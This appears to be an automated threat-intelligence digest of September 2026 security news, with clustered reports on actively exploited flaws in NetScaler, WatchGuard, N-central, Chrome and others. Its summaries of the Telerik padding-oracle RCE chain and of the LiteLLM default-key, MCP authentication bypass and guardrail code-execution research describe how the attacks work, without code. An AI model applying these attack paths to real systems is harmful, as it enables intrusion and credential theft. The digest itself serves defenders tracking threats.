The US Cybersecurity and Infrastructure Security Agency (CISA) on Wednesday warned that threat actors have been exploiting a critical-severity NetScaler vulnerability in attacks. Tracked as CVE-2026-19490 (CVSS score of 9.3), the security defect impacts all NetScaler ADC and NetScaler Gateway appliances configured as a gateway (SSL VPN, ICA Proxy, CVPN, RDP Proxy) or an AAA virtual server. Citrix patched the flaw on August 19, when cybersecurity firm Rapid7 warned that it could be exploited remotely without authentication. Rapid7 also said it was expecting threat actors to start exploiting the bug shortly, given the nature of NetScaler deployments within enterprise environments. “Organizations should prioritize patching affected systems on an emergency basis, since Citrix products are high-value targets that tend to quickly see exploitation in the wild,” the company said. On Wednesday, CISA added CVE-2026-19490 to its Known Exploited Vulnerabilities ( KEV ) catalog, urging federal agencies to patch it within three days, in line with BOD 26-04’s requirements. Advertisement. Scroll to continue reading. While the cybersecurity agency has not provided details on the observed exploitation attempts, its alert comes roughly a week after Previdian founder and former WatchTowr head of threat intelligence Ryan Dewhurst warned that hackers started exploiting the vulnerability. “An unverified but credible PoC appeared yesterday. Today, 3 IPs across 3 countries sent matching requests to our sensor,” Dewhurst said . CVE-2026-19490’s exploitation has been ongoing since at least September 3, one day after an exploit targeting it was published on GitHub, data from Previdian shows . Related: Organizations Warned of Cisco Secure FMC Exploitation Related: New ‘ShieldCrash’ Zero-Day Exploit Targets Microsoft Defender Related: Fortinet Code Execution Flaw Exploited in PivotC2 RAT Attacks Related: N-able Patches Critical Zero-Day in N-central Written By Ionut Arghire Ionut Arghire is an international correspondent for SecurityWeek. Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing for the latest cybersecurity threats, trends, and expert insights. More from Ionut Arghire Android’s September 2026 Updates Patch 180 Vulnerabilities Chipmaker Patch Tuesday: Nvidia, AMD, Arm Issue Security Advisories Fortinet Patches Critical Vulnerabilities in FortiMonitorOnSight, Chrome Extension ICS Patch Tuesday: Schneider Electric, Siemens Fix Critical Flaws Ivanti Patches Critical Flaws Across Enterprise Security Products Chrome 153 Patches Seventh Zero-Day of 2026 Microsoft Patches Record 974 Vulnerabilities, Including Two Exploited Zero-Days Adobe Patches Over 170 Vulnerabilities, Including Commerce Zero-Day Latest News Deceptive Android Apps Exploit Google Play Early Access to Evade Reviews Webinar Today: Keep Pace With AI – A New Operating Model for Endpoint Remediation Widened Scan Turns Up Fourth Rogue Claude Cyber Incident 4.1 Million Impacted by AdaptHealth Data Breach Organizations Warned of Cisco Secure FMC Exploitation New ‘ShieldCrash’ Zero-Day Exploit Targets Microsoft Defender Fortinet Code Execution Flaw Exploited in PivotC2 RAT Attacks HelmGuard Raises $7.3 Million for Agentic GRC and Security Trending Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing to stay informed on the latest threats, trends, and technology, along with insightful columns from industry experts. Virtual Event: Attack Surface Management Summit 2026 September 16, 2026 Join as speakers examine the various components of ASM strategy, the push to mandate continuous asset visibility and inventory tools, and the use of red-teaming, bug bounties and pen-tests in modern security programs. Register Webinar: Minimum Viable Business: Can You Prove Your Organization Would Recover? September 2, 2026 In this live webinar, learn how to define your minimum viable business, identify the systems it depends on, measure actual recovery time against business r
```

#### Corroborating sources (1)

- **SecurityWeek** (cyber_news_breach_reporting)
  - Title: Critical NetScaler Vulnerability Exploited in Attacks
  - Published: 2026-09-10T12:20:21+00:00
  - Link: https://www.securityweek.com/critical-netscaler-vulnerability-exploited-in-attacks/
  - Summary: Tracked as CVE-2026-19490, the authentication bypass flaw has been exploited in the wild since at least September 3. The post Critical NetScaler Vulnerability Exploited in Attacks appeared first on SecurityWeek .

### Cluster 19d1519629 — score 25

- Title: September 2026 Microsoft Patch Tuesday, (Tue, Sep 8th)
- Source: SANS Internet Storm Center (government_authoritative)
- Published: 2026-09-08T19:20:30+00:00
- Link: https://isc.sans.edu/diary/rss/33320
- Fetch status: fetch_failed:HTTPError
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation
- urgency_signals: actively_exploited
- content_type: news_report
- confidence_tier: tier_1_government

#### Primary article taxonomy
- threat_categories: active_exploitation
- urgency_signals: actively_exploited
- content_type: news_report
- confidence_tier: tier_1_government

#### Summary

```
This month, Microsoft released patches for a record-breaking 973 vulnerabilities, including 113 rated critical. It is by far the largest Patch Tuesday to date, well ahead of the previous high of 664 set in July 2026. Two vulnerabilities are listed as exploited in the wild, while none were publicly disclosed before Patch Tuesday. Notable fixes include Windows privilege escalation and critical RCEs in Skype for Business, MSMQ and RRAS.
```

#### Corroborating sources (1)

- **SANS Internet Storm Center** (government_authoritative)
  - Title: September 2026 Microsoft Patch Tuesday, (Tue, Sep 8th)
  - Published: 2026-09-08T19:20:30+00:00
  - Link: https://isc.sans.edu/diary/rss/33320
  - Summary: This month, Microsoft released patches for a record-breaking 973 vulnerabilities, including 113 rated critical. It is by far the largest Patch Tuesday to date, well ahead of the previous high of 664 set in July 2026. Two vulnerabilities are listed as exploited in the wild, while none were publicly disclosed before Patch Tuesday. Notable fixes include Windows privilege escalation and critical RCEs in Skype for Business, MSMQ and RRAS.

### Cluster 66a3633edb — score 24

- Title: CISA: WatchGuard RCE flaw now exploited in ransomware attacks
- Source: BleepingComputer (cyber_news_breach_reporting)
- Published: 2026-09-10T09:10:20+00:00
- Link: https://www.bleepingcomputer.com/news/security/cisa-watchguard-rce-flaw-now-exploited-in-ransomware-attacks/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, ransomware_extortion
- affected_industries: government
- affected_products: Citrix, Microsoft SharePoint
- cve_ids: CVE-2022-23176, CVE-2025-14733, CVE-2025-9242
- urgency_signals: actively_exploited, no_patch_yet, preauth_unauth
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion, active_exploitation
- affected_industries: government
- affected_products: Citrix, Microsoft SharePoint
- cve_ids: CVE-2025-14733, CVE-2022-23176, CVE-2025-9242
- urgency_signals: actively_exploited, preauth_unauth, no_patch_yet
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
The U.S. Cybersecurity and Infrastructure Security Agency (CISA) has confirmed that ransomware gangs are also exploiting a critical WatchGuard Firebox firewall vulnerability, which it flagged as actively exploited in December. [...]
```

#### Full body

```
CISA: WatchGuard RCE flaw now exploited in ransomware attacks By Sergiu Gatlan September 10, 2026 05:10 AM 0 The U.S. Cybersecurity and Infrastructure Security Agency (CISA) has confirmed that ransomware gangs are also exploiting a critical WatchGuard Firebox firewall vulnerability, which it flagged as actively exploited in December. This flaw is tracked as CVE-2025-14733 and stems from an out-of-bounds write allowing unauthenticated threat actors to execute malicious code remotely in low-complexity attacks. This vulnerability affects firewalls running Fireware OS 11.x and later (including 11.12.4_Update1), 12.x or later (including 12.11.5), and 2025.1 through 2025.1.3. When it released CVE-2025-14733 security patches in December, WatchGuard said unpatched Firebox firewalls are vulnerable to attacks only if configured to use IKEv2 VPN, but noted they might still be compromised even if the vulnerable configurations have been deleted if a branch office VPN to a static gateway peer is still configured. WatchGuard also confirmed that attackers were exploiting the flaw in the wild and shared indicators of compromise to help customers check whether their Firebox devices have been hacked. Internet security watchdog group Shadowserver found over 115,00 unpatched Firebox firewalls exposed online in December, and nearly 9,000 instances remain unsecured after nine months. Vulnerable WatchGuard firewalls exposed online (Shadowserver) In a Thursday update to its catalog of actively exploited vulnerabilities, the U.S. Cybersecurity and Infrastructure Security Agency (CISA) said the CVE-2025-14733 flaw is now known to be used by ransomware gangs but has not provided more details about their attacks. CISA first added the flaw to its Known Exploited Vulnerabilities (KEV) catalog in December, when it ordered U.S. federal agencies to secure their systems within a week, as mandated by Binding Operational Directive (BOD) 22-01. Two years ago, the cybersecurity agency ordered government agencies to patch another actively exploited WatchGuard flaw (CVE-2022-23176) affecting Firebox and XTM firewalls . More recently, in September 2025, WatchGuard patched an RCE vulnerability (CVE-2025-9242) affecting Firebox firewalls and almost identical to CVE-2025-14733. One month later, CISA tagged the flaw as actively exploited, and Shadowserver found more than 75,000 Firebox firewalls vulnerable to attacks. WatchGuard provides services to more than 250,000 small and mid-sized companies through a network of more than 17,000 security resellers and service providers worldwide. Once attackers have valid credentials, only 37% of their actions are blocked Overall prevention scores can hide what happens after initial access. Once attackers are using valid credentials, prevention drops sharply. The Blue Report 2026 measures defenses technique by technique across 338 million simulations run in customer production environments. Get the report Related Articles: CISA: Microsoft SharePoint flaw now exploited in ransomware attacks CISA orders feds to patch Citrix NetScaler RCE flaw by Saturday CISA orders urgent patching of actively exploited Zimbra flaw Critical RCE flaw in Windows IKE Extension now actively exploited CISA warns of hackers exploiting Langflow, N-central, Apache Tomcat flaws
```

#### Corroborating sources (1)

- **BleepingComputer** (cyber_news_breach_reporting)
  - Title: CISA: WatchGuard RCE flaw now exploited in ransomware attacks
  - Published: 2026-09-10T09:10:20+00:00
  - Link: https://www.bleepingcomputer.com/news/security/cisa-watchguard-rce-flaw-now-exploited-in-ransomware-attacks/
  - Summary: The U.S. Cybersecurity and Infrastructure Security Agency (CISA) has confirmed that ransomware gangs are also exploiting a critical WatchGuard Firebox firewall vulnerability, which it flagged as actively exploited in December. [...]

### Cluster 1dc5542a11 — score 24

- Title: Telerik UI Padding-Oracle Bug Chained to Unauthenticated RCE — Public Exploit Released
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-09-07T11:20:14+00:00
- Link: https://thehackernews.com/2026/09/telerik-ui-padding-oracle-bug-chained.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, web_shell_backdoor
- cve_ids: CVE-2026-13181, CVE-2026-13182, CVE-2026-13183
- urgency_signals: actively_exploited, preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: web_shell_backdoor, active_exploitation
- cve_ids: CVE-2026-13181, CVE-2026-13182, CVE-2026-13183
- urgency_signals: actively_exploited, preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
A TantoSec proof-of-concept turns an AES-CBC "padding oracle" in Telerik UI for ASP.NET AJAX into unauthenticated remote code execution — but only against applications in a specific non-default configuration, and Progress patched the chain in July. There are no confirmed reports of exploitation in the wild. Security firm TantoSec has published a working exploit chain targeting vulnerabilities
```

#### Full body

```
Telerik UI Padding-Oracle Bug Chained to Unauthenticated RCE — Public Exploit Released  Swati Khandelwal  Sep 07, 2026 Vulnerability / Web Security A TantoSec proof-of-concept turns an AES-CBC "padding oracle" in Telerik UI for ASP.NET AJAX into unauthenticated remote code execution — but only against applications in a specific non-default configuration, and Progress patched the chain in July. There are no confirmed reports of exploitation in the wild. Security firm TantoSec has published a working exploit chain targeting vulnerabilities in Telerik UI for ASP.NET AJAX that can allow an unauthenticated attacker to execute remote code on the server hosting a vulnerable application. Progress Software patched the flaws in July, and exploitation requires a non-default configuration — but the release pairs a detailed write-up with a ready-to-run tool and two payloads, putting a complete attack path in public hands for the first time. The underlying flaws are not new. Progress shipped the fix in version 2026.2.708 (2026 Q2 SP1) on July 8 and published the CVEs and advisory on July 22. What changed on September 7 is the disclosure of the method and the tooling: TantoSec's Marcio Almeida walked through the full chain and released a command-line tool, telerik-rau-exploit, along with two mixed-mode DLL payloads — one that writes a web shell to disk and one that runs entirely in memory. The chain affects the RadAsyncUpload file-upload control in versions 2010.1.309 through 2026.2.519, according to Progress's advisory ; 2026.2.708 and later are fixed. The most serious of the bugs, an unguarded type-resolution flaw tracked as CVE-2026-13181 , carries a CVSS score of 8.1 ("high"); its "high" attack-complexity rating reflects the configuration prerequisites described below rather than any difficulty in exploitation once they are met. Running an affected version is not enough to be exploitable. TantoSec says the chain has "preconditions that are not met by a default installation": a page must render a RadAsyncUpload control whose server-side handler reads the upload result, and the application must be configured with an explicit, non-default encryption key for the control — which, in a twist, is a setting Telerik recommends as hardening. Sites on an affected version without both conditions are not exploitable through this chain. Where those conditions hold, the payoff is code execution with the privileges of the IIS application pool. The entry point is a padding oracle (CVE-2026-13182): because the control encrypts its client-side state with AES-CBC and no integrity check, the server responds differently to tampered data depending on whether the decrypted bytes have valid padding or merely fail to parse as JSON. That difference lets an attacker decrypt — and, with a technique TantoSec built around the control's fixed encryption seed, forge — the encrypted upload configuration without ever knowing the key. The same forgery allows the attacker to name an arbitrary .NET type, which the control resolves without an allowlist (CVE-2026-13181) and deserializes into a gadget that loads a DLL from a location the attacker controls. The uploaded DLL is a mixed-mode assembly that runs native code as soon as it loads. It is not instant: TantoSec's end-to-end run took roughly 127,000 oracle requests — about an hour against a lab target, and longer against a rate-limited server. If the application hides detailed error messages, the oracle can still be read through response timing, a variant tracked as CVE-2026-13183. There are no confirmed reports of the 2026 flaws being exploited in the wild, and none appears in CISA's Known Exploited Vulnerabilities catalog as of September 7. One attack-surface-management vendor, IONIX, states on its site that it is "tracking ongoing exploitation attempts," but it gives no dates, volumes, or other specifics, and does not distinguish exploitation from ordinary internet scanning of the handler. The component itself has a l
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Telerik UI Padding-Oracle Bug Chained to Unauthenticated RCE — Public Exploit Released
  - Published: 2026-09-07T11:20:14+00:00
  - Link: https://thehackernews.com/2026/09/telerik-ui-padding-oracle-bug-chained.html
  - Summary: A TantoSec proof-of-concept turns an AES-CBC "padding oracle" in Telerik UI for ASP.NET AJAX into unauthenticated remote code execution — but only against applications in a specific non-default configuration, and Progress patched the chain in July. There are no confirmed reports of exploitation in the wild. Security firm TantoSec has published a working exploit chain targeting vulnerabilities

### Cluster 81949698a6 — score 24

- Title: N-able Issues Fourth N-central Hotfix in Five Weeks for Unauthenticated RCE Flaw
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-09-07T08:31:12+00:00
- Link: https://thehackernews.com/2026/09/n-able-issues-fourth-n-central-hotfix.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, zero_day
- cve_ids: CVE-2026-86218
- urgency_signals: actively_exploited, poc_available, preauth_unauth, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: zero_day, active_exploitation
- cve_ids: CVE-2026-86218
- urgency_signals: actively_exploited, zero_day, preauth_unauth, poc_available
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Every on-premises N-central build below 2026.3.1.14 — including servers updated to Hotfix 3 a day earlier — needs Hotfix 4. N-able's incident notice says the flaw has been exploited in the wild; its release notes say that is unconfirmed. N-able has released its fourth hotfix in five weeks for the N-central remote monitoring and management (RMM) platform, this time for a
```

#### Full body

```
N-able Issues Fourth N-central Hotfix in Five Weeks for Unauthenticated RCE Flaw  Swati Khandelwal  Sep 07, 2026 Vulnerability / Enterprise Security Every on-premises N-central build below 2026.3.1.14 — including servers updated to Hotfix 3 a day earlier — needs Hotfix 4. N-able's incident notice says the flaw has been exploited in the wild; its release notes say that is unconfirmed. N-able has released its fourth hotfix in five weeks for the N-central remote monitoring and management (RMM) platform, this time for a maximum-severity vulnerability that could allow remote code execution on the N-central server without authentication. The company's own communications disagree on whether the flaw has already been exploited. The vulnerability, tracked as CVE-2026-86218 , carries a CVSS 4.0 score of 10.0, assigned by N-able as the CVE Numbering Authority, and is classed as a static code injection weakness (CWE-96). It affects every N-central build before 2026.3.1.14, the build shipped as 2026.3 Hotfix 4 in the early hours of September 6 (UTC). That includes servers already updated to Hotfix 3 (2026.3.1.13), which N-able had published a little over eight hours earlier for two flaws that it says are unrelated to the new one. N-able said hosted N-central (NCOD) instances have already been patched. On-premises customers are told to upgrade to 2026.3.1.14 immediately; the release notes list direct upgrade paths from 2025.4, 2026.1, 2026.2, 2026.3, and the 2026.3.1 hotfixes, and say agents do not need to be upgraded to be protected from this CVE. The release notes, status post, and incident notice contain no indicators of compromise, no interim mitigation, and no detection guidance beyond a recommendation to audit N-central user accounts for unexpected users. Huntress, which has been tracking attacks on N-central since August, has advised administrators to restrict inbound access to the console with IP allowlisting or a VPN and, where a server is still reachable from the internet, to consider taking it offline until the hotfix is applied. On the question of exploitation, N-able's channels diverge. The Hotfix 4 release notes and status post state that a third party responsibly disclosed the vulnerability through the company's security disclosure program and that N-able has "no confirmations that this vulnerability has been exploited in production environments." The same release notes on N-able's documentation site also describe it as a "critical zero-day vulnerability," a term N-able does not define. N-able's incident notice on its uptime status page goes further. It says a third, independent security researcher alerted the company to a new vulnerability unrelated to the previously disclosed CVEs and that, unlike those, the newly identified flaw "has been observed being exploited in the wild." The notice does not say who observed the exploitation, where, or when, and N-able has not attributed the activity to any actor. As of September 7, the incident was still listed as open on N-able's status page, as mirrored by the status-page aggregator IsDown . The Hacker News has reached out to N-able for clarification on which statement is current and what evidence of exploitation the company holds. Huntress said it cannot settle the question from its own data. The company began investigating on September 4 after a customer's fully patched N-central production environment was compromised. It said it reproduced a proof-of-concept exploit chain against build 2026.3.1.10 that may use one or both of the two flaws later fixed in Hotfix 3, but the appliance's logs had already rotated, leaving it "unable to say whether this new CVE was the vulnerability exploited" in that intrusion. In response to questions from The Hacker News, Ben Bernstein, cybersecurity advisor at Huntress, said the "actively exploited" description in its post "is based entirely on N-able's statements," namely the incident notice and a post on the MSPGeek Discord in which N-able's Ja
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: N-able Issues Fourth N-central Hotfix in Five Weeks for Unauthenticated RCE Flaw
  - Published: 2026-09-07T08:31:12+00:00
  - Link: https://thehackernews.com/2026/09/n-able-issues-fourth-n-central-hotfix.html
  - Summary: Every on-premises N-central build below 2026.3.1.14 — including servers updated to Hotfix 3 a day earlier — needs Hotfix 4. N-able's incident notice says the flaw has been exploited in the wild; its release notes say that is unconfirmed. N-able has released its fourth hotfix in five weeks for the N-central remote monitoring and management (RMM) platform, this time for a

### Cluster 462fbf5ade — score 23

- Title: Off Guard: Breaking LiteLLM from authentication bypass to cloud compromise
- Source: Wiz Research (cloud_identity_infrastructure)
- Published: 2026-09-09T16:06:00+00:00
- Link: https://www.wiz.io/blog/off-guard-breaking-litellm-from-authentication-bypass-to-cloud-compromise
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, credential_theft
- affected_products: AWS, Anthropic/Claude, OpenAI/ChatGPT
- cve_ids: CVE-2026-59821, CVE-2026-59822
- urgency_signals: actively_exploited, preauth_unauth
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: credential_theft, active_exploitation
- affected_products: Anthropic/Claude, OpenAI/ChatGPT, AWS
- cve_ids: CVE-2026-59822, CVE-2026-59821
- urgency_signals: actively_exploited, preauth_unauth
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
How default keys, unauthenticated MCP sessions, and custom code guardrails expose cloud AI infrastructure to root-level remote code execution and IAM theft.
```

#### Full body

```
Nearly 1 in 10 publicly accessible LiteLLM instances accept a default master key or require no authentication at all. We found this while scanning roughly 3,000 internet-facing deployments of the most popular open-source LLM gateway. The usual concern with that kind of exposure is LLMjacking -someone using the credentials to run API calls on your bill - however, we wanted to check whether an attacker could do worse than that: could they achieve code execution on the host? Furthermore, could they exploit this to compromise the wider environment? We decided to use Claude Code to work through LiteLLM's codebase, looking for features that accept user-controlled input and pass it to an execution context. We found multiple issues, as detailed below. Key findings: MCP authentication bypass via the MCP endpoint (CVE-2026-59822) - an arbitrary Bearer token can create a valid session; confirmed as exploitable across hundreds of Internet-facing instances. Post-auth root-level remote code execution via LiteLLM's custom code guardrails (CVE-2026-59821). 9.6% of 3,074 public instances (at the time of this research) accepted the default master key ( sk-1234 ) or required no authentication at all. In these cases, the RCE is effectively pre-auth. Unauthenticated access as admin by default (no CVE assigned; fixed alongside CVE-2026-59821) - when no authentication is configured, all users are granted PROXY_ADMIN access. Post-auth cloud credential theft vector via the pass-through endpoint feature, as it lacks URL validation. This isn’t considered a vulnerability and therefore wasn’t fixed or assigned a CVE, meaning the technique remains abusable in post-auth scenarios. However, similarly to the above, when chained with a default master key or missing authentication, this is effectively pre-auth. All vulnerabilities have since been responsibly disclosed to LiteLLM and have patches available. CVE-2026-59822 has been added to CISA's Known Exploited Vulnerabilities catalog, and we observed it being exploited in the wild via our honeypot infrastructure. This research was previously presented at DEF CON 34. Background: What is LiteLLM? LiteLLM is an open-source AI gateway that provides a unified OpenAI-compatible API for over 100 LLM providers, including OpenAI, Anthropic, AWS Bedrock, Azure, and Google Vertex AI. Organizations route their LLM traffic through it so they can centrally manage their API keys, enforce budgets, apply guardrails, monitor usage, etc. LiteLLM is one of the most popular open-source AI gateways, present in approximately one-third of cloud environments according to Wiz data. LiteLLM can hold API keys for every configured LLM provider, process every prompt and response that flows through it, and connect to external tools via MCP. A compromised LiteLLM instance means compromised AI infrastructure, and, as we'll show, often the cloud environment it runs in. The conventional risk model for this is LLMjacking: an attacker makes API calls on the organization's behalf, runs up costs, and exfiltrates whatever provider keys are configured. While this is indeed a proven real-world risk, LiteLLM isn't just a credential store. It executes server-side Python on every inference request, can proxy requests to arbitrary internal URLs, and connects to internal tools and systems via MCP. Therefore, we wanted to know what an attacker could actually do with a compromised instance beyond just API abuse. Searching for Attack Paths Using Claude Code, we went through guardrails, pass-through endpoints, model configuration, hook systems, and the MCP layer. Three features had obvious attack surface: MCP authentication handler ( user_api_key_auth_mcp.py ): a separate auth path for the Model Context Protocol endpoint Custom code guardrails ( guardrail_endpoints.py ): administrators submit Python code that the server passes to exec(compile(...)) Pass-through endpoints ( pass_through_endpoints.py ): proxy routes that forward requests to arbitrary URLs with n
```

#### Corroborating sources (1)

- **Wiz Research** (cloud_identity_infrastructure)
  - Title: Off Guard: Breaking LiteLLM from authentication bypass to cloud compromise
  - Published: 2026-09-09T16:06:00+00:00
  - Link: https://www.wiz.io/blog/off-guard-breaking-litellm-from-authentication-bypass-to-cloud-compromise
  - Summary: How default keys, unauthenticated MCP sessions, and custom code guardrails expose cloud AI infrastructure to root-level remote code execution and IAM theft.

### Cluster aa7b1774d3 — score 20

- Title: Critical MikroTik Vulnerability - Patch Now, (Sun, Sep 6th)
- Source: SANS Internet Storm Center (government_authoritative)
- Published: 2026-09-06T21:43:17+00:00
- Link: https://isc.sans.edu/diary/rss/33314
- Fetch status: fetch_failed:HTTPError
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_government

#### Primary article taxonomy
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_government

#### Summary

```
Mikrotik released a patch late last week for an already-exploited vulnerability. The vulnerability allows an SSH authentication bypass and is already being exploited. At this point, assume compromise. Attackers have been adding new accounts to affected devices to maintain access after a patch is installed.
```

#### Corroborating sources (1)

- **SANS Internet Storm Center** (government_authoritative)
  - Title: Critical MikroTik Vulnerability - Patch Now, (Sun, Sep 6th)
  - Published: 2026-09-06T21:43:17+00:00
  - Link: https://isc.sans.edu/diary/rss/33314
  - Summary: Mikrotik released a patch late last week for an already-exploited vulnerability. The vulnerability allows an SSH authentication bypass and is already being exploited. At this point, assume compromise. Attackers have been adding new accounts to affected devices to maintain access after a patch is installed.

### Cluster aa9e62a68c — score 20

- Title: Chrome V8 Zero-Day Exploited in the Wild Enables Code Execution Inside Sandbox
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-09-09T09:11:03+00:00
- Link: https://thehackernews.com/2026/09/chrome-v8-zero-day-exploited-in-wild.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-87491

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, supply_chain, web_shell_backdoor, zero_day
- affected_industries: education, government
- affected_products: AWS, OpenAI/ChatGPT
- cve_ids: CVE-2026-2441, CVE-2026-3909, CVE-2026-3910, CVE-2026-5281, CVE-2026-87491
- urgency_signals: actively_exploited, no_patch_yet, preauth_unauth, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: supply_chain, zero_day, web_shell_backdoor, active_exploitation
- affected_industries: government, education
- affected_products: OpenAI/ChatGPT, AWS
- cve_ids: CVE-2026-87491, CVE-2026-2441, CVE-2026-3909, CVE-2026-3910, CVE-2026-5281
- urgency_signals: actively_exploited, zero_day, preauth_unauth, no_patch_yet
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Google on Tuesday released updates to patch 230 security vulnerabilities, including one that has come under active exploitation in the wild. The medium-severity vulnerability, assigned the CVE identifier CVE-2026-87491 (CVSS score: N/A), has been described as an out-of-bounds bug in V8, Chrome's JavaScript and WebAssembly engine. "Out-of-bounds write in V8 in Google Chrome prior to
```

#### Full body

```
Chrome V8 Zero-Day Exploited in the Wild Enables Code Execution Inside Sandbox  Ravie Lakshmanan  Sep 09, 2026 Vulnerability / Browser Security Google on Tuesday released updates to patch 230 security vulnerabilities, including one that has come under active exploitation in the wild. The medium-severity vulnerability, assigned the CVE identifier CVE-2026-87491 (CVSS score: N/A), has been described as an out-of-bounds bug in V8, Chrome's JavaScript and WebAssembly engine. "Out-of-bounds write in V8 in Google Chrome prior to 153.0.8010.36 allowed a remote attacker to execute arbitrary code inside the sandbox via a crafted HTML page," reads a description of the flaw on the NIST National Vulnerability Database (NVD). Security researcher Jihyeon Jeong of Compsec Lab, Seoul National University, has been acknowledged for discovering and reporting the flaw on August 6, 2026. The researcher received a $2,500 bug bounty reward for responsible disclosure. Google acknowledged it is "aware that an exploit for CVE-2026-87491 exists in the wild," but has not disclosed any additional specific information related to how it's being weaponized in real-world attacks and who is behind them. "Access to bug details and links may be kept restricted until a majority of users are updated with a fix," the tech giant added. "We will also retain restrictions if the bug exists in a third party library that other projects similarly depend on, but haven’t yet fixed." With the latest development, Google has addressed a total of seven actively exploited Chrome zero-days since the start of the year. This includes CVE-2026-2441 , CVE-2026-3909, CVE-2026-3910 , CVE-2026-5281 , CVE-2026-11645 , and CVE-2026-85046 . Besides CVE-2026-87491, the latest update also fixes five critical security flaws in WebGL and Cast components - CVE-2026-87464 - Use-after-free in WebGL CVE-2026-87488 - Use-after-free in WebGL CVE-2026-87438 - Out-of-bounds write in WebGL CVE-2026-87527 - Buffer overflow in WebGL CVE-2026-87628 - Use-after-free in Cast Google said it reported 195 out of the 230 flaws that have been addressed in the update. One high use-after-free flaw in WebPackaging (CVE-2026-87639) is credited to OpenAI Codex Security. "Many of our security bugs are detected using AddressSanitizer , MemorySanitizer , UndefinedBehaviorSanitizer , Control Flow Integrity , libFuzzer , or AFL ," the company added. For optimal protection, users are advised to update their Chrome browser to versions 153.0.8010.36/.37 for Windows and Apple macOS, and 153.0.8010.36 for Linux. To ensure the latest updates are installed, users can navigate to More > Help > About Google Chrome and select Relaunch. Users of other Chromium-based browsers, such as Microsoft Edge, Brave, Opera, and Vivaldi, are also advised to apply the fixes as and when they become available. Update The U.S. Cybersecurity and Infrastructure Security Agency (CISA), on September 9, 2026, added CVE-2026-87491 to its Known Exploited Vulnerabilities ( KEV ) catalog, requiring Federal Civilian Executive Branch (FCEB) agencies to apply the patches by September 23, 2026. Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  artificial intelligence , Google Chrome , Vulnerability , Web Security , Zero-Day ⚡ Top Stories This Week Attackers Exploit Critical Langflow and Rails Flaws in Credential-Probing and C2 Activity Iranian Hackers Pose as Recruiters to Deliver Cross-Platform RATs Through Coding Tests ⚡ Weekly Recap: Chrome 0-Day, Router Hijacks, Coder Supply Chain Attack and More N-able Issues Fourth N-central Hotfix in Five Weeks for Unauthenticated RCE Flaw Attackers Hijack MikroTik Routers Through Internet-Exposed SSH Without Authentication Unpatched Magento and Adobe Commerce Zero-Day Exploited to Backdoor Online Stores Attackers Breached JetBrains Cadence via Unpatched TeamCity, Extracting AWS Credentials Critic
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Chrome V8 Zero-Day Exploited in the Wild Enables Code Execution Inside Sandbox
  - Published: 2026-09-09T09:11:03+00:00
  - Link: https://thehackernews.com/2026/09/chrome-v8-zero-day-exploited-in-wild.html
  - Summary: Google on Tuesday released updates to patch 230 security vulnerabilities, including one that has come under active exploitation in the wild. The medium-severity vulnerability, assigned the CVE identifier CVE-2026-87491 (CVSS score: N/A), has been described as an out-of-bounds bug in V8, Chrome's JavaScript and WebAssembly engine. "Out-of-bounds write in V8 in Google Chrome prior to

### Cluster 81b3bf0ce0 — score 20

- Title: Adobe Patches Magento Zero-Day Exploited to Deploy Rust Backdoor and PHP Web Shell
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-09-08T09:13:47+00:00
- Link: https://thehackernews.com/2026/09/adobe-patches-magento-zero-day.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-75650

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, web_shell_backdoor, zero_day
- affected_industries: government, retail_ecommerce
- cve_ids: CVE-2026-48273, CVE-2026-75650, CVE-2026-75746, CVE-2026-82004
- urgency_signals: actively_exploited, preauth_unauth, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: zero_day, web_shell_backdoor, active_exploitation
- affected_industries: government, retail_ecommerce
- cve_ids: CVE-2026-75650, CVE-2026-82004, CVE-2026-48273, CVE-2026-75746
- urgency_signals: actively_exploited, zero_day, preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
